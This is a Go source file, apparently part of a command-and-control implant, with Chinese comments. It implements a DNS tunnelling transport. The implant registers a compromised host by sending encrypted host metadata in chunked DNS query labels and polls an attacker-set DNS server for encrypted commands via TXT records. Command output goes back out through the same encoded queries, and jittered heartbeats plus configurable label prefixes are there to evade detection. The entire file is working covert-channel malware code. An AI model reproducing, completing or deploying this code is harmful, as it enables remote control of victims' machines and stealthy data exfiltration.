//go:build transport_dns || transport_multi

package main

import (
	"encoding/base32"
	"fmt"
	"implant/core/app"
	"implant/core/debuglog"
	"implant/core/communication"
	"implant/core/config"
	"implant/core/encrypt"
	"implant/core/reconnect"
	"implant/core/utils"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
)


// DNSClient 实现 communication.Transport（DNS 隧道轮询模型）。
// config.Host = "DNSServer:53:tunnel.domain"（冒号分隔，与 listener 的 OSS 格式一致）。
type DNSClient struct {
	dnsServer    string
	domain       string
	clientID     string // 32 hex uid，作 DNS 查询标识（服务端 uid = BytesToMD5(metaInfo)）
	reconnectMgr *reconnect.ReconnectManager
	connected    bool
	metaInfoB32  string      // base32(EncodeBase64(EncryptedMetaInfo))，仅 mi 注册分块用
	client       *dns.Client // 复用的 DNS 客户端（无状态，可并发使用；避免每查询新建）
	heartbeatOnce sync.Once  // 心跳 goroutine 仅启动一次（进程级，与连接无关）
}

// NewTransport 构造 DNS 传输（单二进制 build tag 入口）。
// clientID 与服务端一致：MD5(MetaInfo 明文)（原 main 由 app.Init 返回值传入，此处直接派生）。
// init 注册到运行时传输表（多传输构建下按 scheme 选择；单传输构建下只有自己）
func init() {
	registerTransport("dns", newDNSTransport)
	listenerType = "dns"
}

func newDNSTransport() transportClient {
	cid, _ := utils.GetMetaInfoClientID()
	return &DNSClient{clientID: cid, reconnectMgr: reconnect.NewReconnectManager()}
}

// IsConnected 当前是否已连接
func (c *DNSClient) IsConnected() bool { return c.connected }

// ReconnectMgr 返回重连管理器
func (c *DNSClient) ReconnectMgr() *reconnect.ReconnectManager { return c.reconnectMgr }

// PollInterval 轮询型：空闲间隔 = sleep 基准（SLEEP 命令动态生效），
// jitter 由 runLoop 空闲分支统一施加
func (c *DNSClient) PollInterval() time.Duration { return config.WaitTime }

// StartHeartbeat 启动 DNS 心跳（幂等：仅首次生效，心跳与连接状态无关；
// 间隔逐拍按 sleep×(1±jitter%) 重算，避免固定周期 DNS 查询特征）
func (c *DNSClient) StartHeartbeat() {
	c.heartbeatOnce.Do(func() {
		go app.HeartbeatLoop(make(chan struct{}), c.heartbeat)
	})
}

func (c *DNSClient) fail() {
	c.connected = false
	if c.reconnectMgr != nil {
		c.reconnectMgr.OnReconnectFailed()
	}
}

// 查询名构造（统一用 uid 作标识，单标签短，避免超 253 字符 DNS 查询名上限）。
// dnsLabel 内部标签加前缀（OPSEC：Profile 可配掩码，默认空=保持原样）
func dnsLabel(tag string) string {
	if p := config.DNSLabelPrefix(); p != "" {
		return p + tag
	}
	return tag
}

// fb: <uid>.fb.0001.<domain>
func (c *DNSClient) fbQueryName() string {
	return fmt.Sprintf("%s.%s.0001.%s", c.clientID, dnsLabel("fb"), c.domain)
}

// pl: <uid>.pl.<seq4hex>.<domain>
func (c *DNSClient) pollQueryName(seq int64) string {
	return fmt.Sprintf("%s.%s.%04x.%s", c.clientID, dnsLabel("pl"), seq, c.domain)
}

// hb: <uid>.hb.0000.<domain>
func (c *DNSClient) hbQueryName() string {
	return fmt.Sprintf("%s.%s.0000.%s", c.clientID, dnsLabel("hb"), c.domain)
}

// rs: <chunk>.<idx>_<total>.rs.<uid>.<domain>
func (c *DNSClient) rsQueryName(chunk string, idx, total int) string {
	return fmt.Sprintf("%s.%d_%d.%s.%s.%s", chunk, idx, total, dnsLabel("rs"), c.clientID, c.domain)
}

// mi: <chunk>.<idx>_<total>.<label>.mi 结构随 rs 一致
func (c *DNSClient) miQueryName(chunk string, idx, total int) string {
	return fmt.Sprintf("%s.%d_%d.%s.%s.%s", chunk, idx, total, dnsLabel("mi"), c.clientID, c.domain)
}

func (c *DNSClient) Connect(host string) error {
	if c.reconnectMgr != nil {
		c.reconnectMgr.OnReconnectAttempt()
	}
	parts := strings.SplitN(host, ":", 3)
	if len(parts) < 3 {
		c.fail()
		return fmt.Errorf("DNS 配置格式错误: %q（需 DNSServer:53:domain）", host)
	}
	c.dnsServer = parts[0] + ":" + parts[1]
	c.domain = parts[2]
	if !strings.HasSuffix(c.domain, ".") {
		c.domain += "."
	}

	// MetaInfo：仅 mi 注册分块用（DNS 查询标识用短 uid，避免超 253 字符限制）
	if len(utils.MetaInfo) == 0 {
		metaRaw, metaErr := utils.EncryptedMetaInfo()
		if metaErr != nil {
			c.fail()
			return fmt.Errorf("生成 MetaInfo 失败: %v", metaErr)
		}
		metaB64, metaErr2 := encrypt.EncodeBase64(metaRaw)
		if metaErr2 != nil {
			c.fail()
			return fmt.Errorf("编码 MetaInfo 失败: %v", metaErr2)
		}
		utils.MetaInfo = metaB64
	}
	c.metaInfoB32 = b32Encode(utils.MetaInfo)

	// 注册：mi 分块上行加密 MetaInfo（uid 作标识，服务端据此注册 + 派生会话密钥）
	if err := c.sendMetaInfo(); err != nil {
		c.fail()
		return fmt.Errorf("DNS 注册(MetaInfo)失败: %v", err)
	}

	// FirstBlood: 发 fb 查询（用 uid 标识，单标签短）
	fbQuery := c.fbQueryName()
	resp, err := c.dnsQuery(fbQuery)
	if err != nil {
		c.fail()
		return fmt.Errorf("DNS FirstBlood 失败: %v", err)
	}

	// 设置会话密钥
	salt, masterKey := app.GetListenerKeyConfig("dns")
	if err := encrypt.GlobalClientKeyManager.SetSessionKey(salt[:16], masterKey[:32]); err != nil {
		c.fail()
		return err
	}
	c.connected = true
	if c.reconnectMgr != nil {
		c.reconnectMgr.OnReconnectSuccess()
	}

	if resp != "" {
		debuglog.Printf("✅ [DNS] FirstBlood 成功，响应: %s...\n", resp[:min(len(resp), 20)])
	} else {
		debuglog.Printf("✅ [DNS] FirstBlood 成功\n")
	}
	return nil
}

// sendMetaInfo 将加密 MetaInfo 分块上行（mi 查询），供服务端注册客户端。
// 每段 ≤60 字符（DNS 标签限 63），查询名 = chunk.idx_total.mi.uid.domain。
func (c *DNSClient) sendMetaInfo() error {
	chunkSize := 60
	total := (len(c.metaInfoB32) + chunkSize - 1) / chunkSize
	if total == 0 {
		total = 1
	}
	for i := 0; i < len(c.metaInfoB32); i += chunkSize {
		end := i + chunkSize
		if end > len(c.metaInfoB32) {
			end = len(c.metaInfoB32)
		}
		chunk := c.metaInfoB32[i:end]
		idx := i / chunkSize
		query := c.miQueryName(chunk, idx, total)
		if _, err := c.dnsQuery(query); err != nil {
			return err
		}
		time.Sleep(50 * time.Millisecond) // DNS 查询间隔
	}
	return nil
}

// Recv: 轮询命令。每次发 pl 查询，解析 TXT 响应，解密返回。无命令返回 nil。
func (c *DNSClient) Recv() ([]byte, error) {
	if !c.connected {
		c.fail()
		return nil, fmt.Errorf("未连接")
	}
	pollQuery := c.pollQueryName(time.Now().UnixNano() & 0xFFFF)
	resp, err := c.dnsQuery(pollQuery)
	if err != nil {
		return nil, err
	}
	if resp == "" {
		return nil, nil // 无命令
	}

	// resp = base32(encryptedCmd)
	encryptedCmd, err := b32Decode(resp)
	if err != nil {
		return nil, err
	}
	decrypted, err := communication.DecryptCommand(encryptedCmd)
	if err != nil {
		return nil, err
	}
	// 【会话密钥唯一化】消费服务端下发的 nonce 协商消息（type=4）
	return communication.ConsumeSessionNonce(decrypted)
}

// SendResult: 通过 DNS 上行回送结果。分块编码在 rs 查询中。
// 格式: base32(chunk).idx_total.rs.uid.domain
func (c *DNSClient) SendResult(b64Packet []byte) error {
	if !c.connected {
		return fmt.Errorf("未连接")
	}
	encoded := b32Encode(b64Packet)
	chunkSize := 60 // 每段最大 60 字符（DNS 标签限 63）
	total := (len(encoded) + chunkSize - 1) / chunkSize
	if total == 0 {
		total = 1
	}
	for i := 0; i < len(encoded); i += chunkSize {
		end := i + chunkSize
		if end > len(encoded) {
			end = len(encoded)
		}
		chunk := encoded[i:end]
		idx := i / chunkSize
		query := c.rsQueryName(chunk, idx, total)
		_, err := c.dnsQuery(query)
		if err != nil {
			return err
		}
		time.Sleep(50 * time.Millisecond) // DNS 查询间隔
	}
	return nil
}

func (c *DNSClient) Close() error { return nil }

// dnsQuery 发送 DNS TXT 查询，返回 TXT 响应字符串（空表示无数据）。
// 复用 dns.Client（无状态、可并发）。dns.Msg 每查询新建：心跳 goroutine 与主循环并发
// 调用本函数，共享 Msg 会数据竞争。
func (c *DNSClient) dnsQuery(name string) (string, error) {
	// 【优化】删除每查询一条的 [DNS-QUERY] 日志（DNS 轮询高频）
	if c.client == nil {
		c.client = new(dns.Client)
	}
	m := new(dns.Msg)
	m.SetQuestion(name, dns.TypeTXT)
	m.RecursionDesired = false

	r, _, err := c.client.Exchange(m, c.dnsServer)
	if err != nil {
		debuglog.Printf("❌ [DNS-QUERY] error: %v\n", err)
		c.fail()
		return "", err
	}
	if len(r.Answer) == 0 {
		return "", nil
	}
	if txt, ok := r.Answer[0].(*dns.TXT); ok && len(txt.Txt) > 0 {
		// 聚合 TXT 全部分片（服务端超长数据拆分为多个 255 字节分片）
		return strings.Join(txt.Txt, ""), nil
	}
	return "", nil
}

// b32Encode/b32Decode: base32-hex 编码（与服务端一致，无填充，小写）。
func b32Encode(data []byte) string {
	return strings.ToLower(strings.TrimRight(
		base32.HexEncoding.WithPadding(base32.NoPadding).EncodeToString(data), "="))
}

func b32Decode(s string) ([]byte, error) {
	return base32.HexEncoding.WithPadding(base32.NoPadding).DecodeString(strings.ToUpper(s))
}

// heartbeat: 发 hb 查询
func (c *DNSClient) heartbeat() {
	if !c.connected {
		return
	}
	query := c.hbQueryName()
	c.dnsQuery(query)
}
